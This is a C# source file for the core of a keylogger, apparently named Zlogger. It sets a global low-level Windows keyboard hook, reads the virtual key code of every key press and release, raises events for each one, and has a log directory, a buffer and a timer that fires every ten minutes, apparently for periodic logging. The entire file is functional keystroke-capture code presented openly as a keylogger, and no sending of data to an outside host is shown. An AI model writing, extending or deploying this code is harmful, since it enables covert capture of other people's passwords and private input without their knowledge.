using Rodjenihm.Zlogger.WinAPI;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;

namespace Rodjenihm.Zlogger.Core
{
    public class Keylogger : IDisposable
    {
        private readonly LowLevelKeyboardHook hook;
        private readonly HOOKPROC keyboardHookProc = null;
        public string LogDir { get; set; } = string.Empty;
        public StringBuilder Buffer { get; } = new StringBuilder();
        public double Interval { get; set; } = 600;
        private readonly Timer timer = new Timer();

        public Keylogger()
        {
            timer.Interval = 1000 * Interval;
            timer.Enabled = true;
            timer.Elapsed += OnIntervalElapsed;

            hook = new LowLevelKeyboardHook();
            keyboardHookProc = (nCode, wParam, lParam) =>
            {
                if (nCode >= 0)
                {
                    var vkCode = Marshal.ReadInt32(lParam);
                    var keyEventArgs = new KeyEventArgs { VkCode = vkCode };

                    if (wParam == (IntPtr)WindowsMessages.WM_KEYDOWN)
                    {
                        OnKeyDown(this, keyEventArgs);
                    }
                    if (wParam == (IntPtr)WindowsMessages.WM_KEYUP)
                    {
                        OnKeyUp(this, keyEventArgs);
                    }
                }

                return hook.NextHook(nCode, wParam, lParam);
            };
        }

        public Keylogger(string logDir) : this()
        {
            LogDir = logDir;
        }

        public void Run()
        {
            if (keyboardHookProc != null) hook.SetHook(keyboardHookProc);
            else throw new ArgumentNullException("Keyboard Hook Procedure is null", nameof(keyboardHookProc));
        }

        public void Dispose()
        {
            hook.RemoveHook();
        }

        public event Action<Keylogger, KeyEventArgs> KeyDown;
        public event Action<Keylogger, KeyEventArgs> KeyUp;
        public event EventHandler IntervalElapsed;

        protected virtual void OnKeyDown(Keylogger sender, KeyEventArgs e)
        {
            KeyDown?.Invoke(sender, e);
        }

        protected virtual void OnKeyUp(Keylogger sender, KeyEventArgs e)
        {
            KeyUp?.Invoke(sender, e);
        }

        protected virtual void OnIntervalElapsed(object sender, EventArgs e)
        {
            IntervalElapsed?.Invoke(sender, e);
        }
    }
}
